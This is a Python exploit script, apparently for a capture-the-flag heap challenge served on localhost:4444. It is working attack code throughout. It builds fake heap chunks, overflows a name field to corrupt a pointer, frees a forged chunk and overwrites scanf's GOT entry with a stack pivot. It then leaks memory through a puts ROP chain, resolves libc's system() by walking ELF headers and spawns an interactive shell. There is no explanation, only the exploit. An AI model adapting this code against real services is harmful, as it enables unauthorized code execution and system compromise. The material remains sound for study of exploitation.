from pwn import *

s = init('localhost', 4444)

def create_rifle(s, name, desc):
    s.send('1\n')
    read_until('name:')
    s.send(name+'\n')
    read_until('description:')
    s.send(desc+'\n')

def leave_msg(s, msg):
    s.send('4\n')
    read_until('order:')
    s.send(msg+'\n')

def submit_order(s):
    s.send('3\n')

def leak(addr):
    global s
    buf="A"*12
    buf+= q(0x80484b0) #puts@plt
    buf+= q(0x8048ae3) #pop; ret
    buf+= q(addr)
    buf+= q(0x08048896) #get_action
    buf+= '\n'
    s.send(buf)
    return read_until('Action:').replace('\nAction: ','')

init_leak(leak)

raw_input('attach gdb..')

print '[+] 2nd controlled word : legit chunk size(1337) for next chunk 8 < 1337 < av_max'
read_until("Action:")
leave_msg(s, '\x00'*36+q(1337))

print '[+] 1st controlled word : size = 56 + 8'
for i in range(0,63): #last will be done by next alloc
    read_until("Action:")
    create_rifle(s, 'A', 'B')

print '[+] values are set, time to overwrite pointer'
read_until("Action:")
#overflow name into previous ptr with address of fake chunk
create_rifle(s, '\x00'*27+q(0x804a2a8), 'B')

print '[+] conditions met, time to free'
read_until("Action:")
submit_order(s)

print '[+] setting up values sh00 and scanf@got'
read_until("Action:")
create_rifle(s, 'sh\x00\x00', q(0x804a258))

print '[+] overwriting scanf with pivot'
read_until("Action:")
leave_msg(s, q(0x8048b42)) # add esp, 0x1c; pop4; ret

print '[+] Trying to leak elf header of binary'
read_until("Action:")
if leak(0x8048000)[0:4] == '\x7fELF':
    print 'success'
else:
    import sys
    print 'fail'
    sys.exit(1)

from binascii import hexlify

lsm = struct.unpack("<I",leak(0x0804a254)[0:4])[0]
print '[+] libc_start_main : ' + hex(lsm)

base = get_elf(lsm)
print '[+] libc base : ' + hex(base)

prog_headers = get_prog_headers(base) + base
print '[+] prog_headers : ' + hex(prog_headers)

dynamic = get_dynamic(prog_headers) + base
print '[+] dynamic : ' + hex(dynamic)

strtab, symtab = get_str_symtab(dynamic)
print '[+] strtab : ' + hex(strtab) + ' symtab : ' + hex(symtab)

system = get_symbol('system', strtab, symtab) + base
print '[+] system : ' + hex(system)

buf = "A"*12
buf += q(system)
buf += "AAAA"
buf += q(0x0804a2c1)
s.send(buf+'\n')

print '\n\n###interact###\n'
interact()
